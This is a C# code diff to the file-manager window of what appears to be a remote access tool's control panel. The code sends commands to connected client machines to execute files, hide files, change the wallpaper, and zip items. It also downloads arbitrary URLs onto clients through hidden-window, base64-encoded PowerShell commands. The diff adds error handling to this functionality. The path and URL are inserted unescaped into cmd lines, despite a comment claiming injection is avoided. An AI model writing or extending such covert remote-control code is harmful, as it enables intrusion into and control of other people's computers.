@@ -494,17 +494,25 @@ public partial class FileManagerWindow : ThemedWindow
     {
         if (GridFiles.SelectedItem is not FileEntryVM row) return;
         var path = Path.Combine(_currentPath, row.Name);
-        
+
         ServerWindow.ReportGlobalActivity("Execute file", row.Name, "running");
         ServerWindow.LogGlobal($"[FM] Executing file '{path}' (mode: {mode}) on client {_clientId}...");
-        
-        await _server.SendToClient(_clientId, new Packet
+
+        try
         {
-            Type = PacketType.FmExec,
-            Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = mode })
-        });
-        TxtStatus.Text = string.Format(Lang.Get("FM_EXECUTED"), row.Name, mode);
-        ServerWindow.ReportGlobalActivity("Execute file", row.Name, "complete");
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmExec,
+                Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = mode })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("FM_EXECUTED"), row.Name, mode);
+            ServerWindow.ReportGlobalActivity("Execute file", row.Name, "complete");
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Execute file", row.Name, "failed");
+        }
     }
 
     private async void Hash_Click(object s, RoutedEventArgs e)
@@ -527,9 +535,10 @@ public partial class FileManagerWindow : ThemedWindow
             var r = JsonConvert.DeserializeObject<FmHashResultData>(json);
             if (r != null && string.IsNullOrEmpty(r.Error))
             {
-                Clipboard.SetText(r.Hash);
+                try { Clipboard.SetText(r.Hash); } catch { }
+                var hashPrefix = r.Hash.Length >= 16 ? r.Hash[..16] : r.Hash;
                 MessageBox.Show($"SHA-256: {r.Hash}\n\n{Lang.Get("FM_COPIED_CLIPBOARD")}", row.Name, MessageBoxButton.OK, MessageBoxImage.Information);
-                TxtStatus.Text = string.Format(Lang.Get("FM_HASH_RESULT"), r.Hash[..16]);
+                TxtStatus.Text = string.Format(Lang.Get("FM_HASH_RESULT"), hashPrefix);
                 ServerWindow.ReportGlobalActivity("Hash completed", row.Name, "success");
                 ServerWindow.LogGlobal($"[FM] Hash computed for '{path}' on client {_clientId}: {r.Hash}");
             }
@@ -555,17 +564,25 @@ public partial class FileManagerWindow : ThemedWindow
         if (GridFiles.SelectedItem is not FileEntryVM row) return;
         var path = Path.Combine(_currentPath, row.Name);
         var targetAction = row.IsHidden ? "Show file" : "Hide file";
-        
+
         ServerWindow.ReportGlobalActivity(targetAction, row.Name, "running");
         ServerWindow.LogGlobal($"[FM] Setting hidden attribute to {!row.IsHidden} for '{path}' on client {_clientId}...");
-        
-        await _server.SendToClient(_clientId, new Packet
+
+        try
         {
-            Type = PacketType.FmShowHide,
-            Data = JsonConvert.SerializeObject(new FmShowHideData { Path = path, Hide = !row.IsHidden })
-        });
-        ServerWindow.ReportGlobalActivity(targetAction, row.Name, "complete");
-        await Navigate(_currentPath);
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmShowHide,
+                Data = JsonConvert.SerializeObject(new FmShowHideData { Path = path, Hide = !row.IsHidden })
+            });
+            ServerWindow.ReportGlobalActivity(targetAction, row.Name, "complete");
+            await Navigate(_currentPath);
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity(targetAction, row.Name, "failed");
+        }
     }
 
     private async void SetAttr_Click(object s, RoutedEventArgs e)
@@ -665,34 +682,50 @@ public partial class FileManagerWindow : ThemedWindow
     {
         if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
         var path = Path.Combine(_currentPath, row.Name);
-        
+
         ServerWindow.ReportGlobalActivity("Set wallpaper", row.Name, "running");
         ServerWindow.LogGlobal($"[FM] Setting wallpaper to '{path}' on client {_clientId}...");
-        
-        await _server.SendToClient(_clientId, new Packet
+
+        try
         {
-            Type = PacketType.FunCmd,
-            Data = JsonConvert.SerializeObject(new FunCmdData { Action = "set_wallpaper", Param = path })
-        });
-        TxtStatus.Text = string.Format(Lang.Get("FM_WALLPAPER_SET"), row.Name);
-        ServerWindow.ReportGlobalActivity("Set wallpaper", row.Name, "complete");
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FunCmd,
+                Data = JsonConvert.SerializeObject(new FunCmdData { Action = "set_wallpaper", Param = path })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("FM_WALLPAPER_SET"), row.Name);
+            ServerWindow.ReportGlobalActivity("Set wallpaper", row.Name, "complete");
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Set wallpaper", row.Name, "failed");
+        }
     }
 
     private async void PlayMusic_Click(object s, RoutedEventArgs e)
     {
         if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
         var path = Path.Combine(_currentPath, row.Name);
-        
+
         ServerWindow.ReportGlobalActivity("Play audio", row.Name, "running");
         ServerWindow.LogGlobal($"[FM] Playing audio file '{path}' on client {_clientId}...");
-        
-        await _server.SendToClient(_clientId, new Packet
+
+        try
         {
-            Type = PacketType.FmExec,
-            Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = "normal" })
-        });
-        TxtStatus.Text = string.Format(Lang.Get("FM_PLAYING"), row.Name);
-        ServerWindow.ReportGlobalActivity("Play audio", row.Name, "complete");
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmExec,
+                Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = "normal" })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("FM_PLAYING"), row.Name);
+            ServerWindow.ReportGlobalActivity("Play audio", row.Name, "complete");
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Play audio", row.Name, "failed");
+        }
     }
 
     private async void Zip_Click(object s, RoutedEventArgs e)
@@ -700,23 +733,31 @@ public partial class FileManagerWindow : ThemedWindow
         if (GridFiles.SelectedItem is not FileEntryVM row) return;
         var path = Path.Combine(_currentPath, row.Name);
         var dest = path + ".zip";
-        
+
         ServerWindow.ReportGlobalActivity("Zip item", row.Name, "running");
         ServerWindow.LogGlobal($"[FM] Zipping '{path}' to '{dest}' on client {_clientId}...");
-        
+
         // Use PS encoded command — path passed via env var to avoid injection
         var ps  = "Compress-Archive -Path $env:SERO_SRC -DestinationPath $env:SERO_DST -Force";
         var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
-        await _server.SendToClient(_clientId, new Packet
+        try
         {
-            Type = PacketType.AutoTaskShell,
-            Data = $"SET SERO_SRC={path}&& SET SERO_DST={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
-        });
-        TxtStatus.Text = string.Format(Lang.Get("FM_ZIPPING"), row.Name);
-        await Task.Delay(2000);
-        ServerWindow.ReportGlobalActivity("Zip item", row.Name, "complete");
-        ServerWindow.LogGlobal($"[FM] Zip command executed for '{path}' on client {_clientId}.");
-        await Navigate(_currentPath);
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.AutoTaskShell,
+                Data = $"SET SERO_SRC={path}&& SET SERO_DST={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
+            });
+            TxtStatus.Text = string.Format(Lang.Get("FM_ZIPPING"), row.Name);
+            await Task.Delay(2000);
+            ServerWindow.ReportGlobalActivity("Zip item", row.Name, "complete");
+            ServerWindow.LogGlobal($"[FM] Zip command executed for '{path}' on client {_clientId}.");
+            await Navigate(_currentPath);
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Zip item", row.Name, "failed");
+        }
     }
 
     private async void DownloadUrl_Click(object s, RoutedEventArgs e)
@@ -744,16 +785,24 @@ public partial class FileManagerWindow : ThemedWindow
         // Use PS encoded command — URL via env var to avoid injection
         var ps  = "Invoke-WebRequest -Uri $env:SERO_URL -OutFile $env:SERO_OUT -UseBasicParsing";
         var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(ps));
-        await _server.SendToClient(_clientId, new Packet
+        try
         {
-            Type = PacketType.AutoTaskShell,
-            Data = $"SET SERO_URL={url}&& SET SERO_OUT={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
-        });
-        TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADING"), filename);
-        await Task.Delay(3000);
-        ServerWindow.ReportGlobalActivity("Download URL", filename, "complete");
-        ServerWindow.LogGlobal($"[FM] Download URL command executed for '{url}' on client {_clientId}.");
-        await Navigate(_currentPath);
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.AutoTaskShell,
+                Data = $"SET SERO_URL={url}&& SET SERO_OUT={dest}&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
+            });
+            TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADING"), filename);
+            await Task.Delay(3000);
+            ServerWindow.ReportGlobalActivity("Download URL", filename, "complete");
+            ServerWindow.LogGlobal($"[FM] Download URL command executed for '{url}' on client {_clientId}.");
+            await Navigate(_currentPath);
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Download URL", filename, "failed");
+        }
     }
 
     // ── Navigation buttons ──────────────────────────
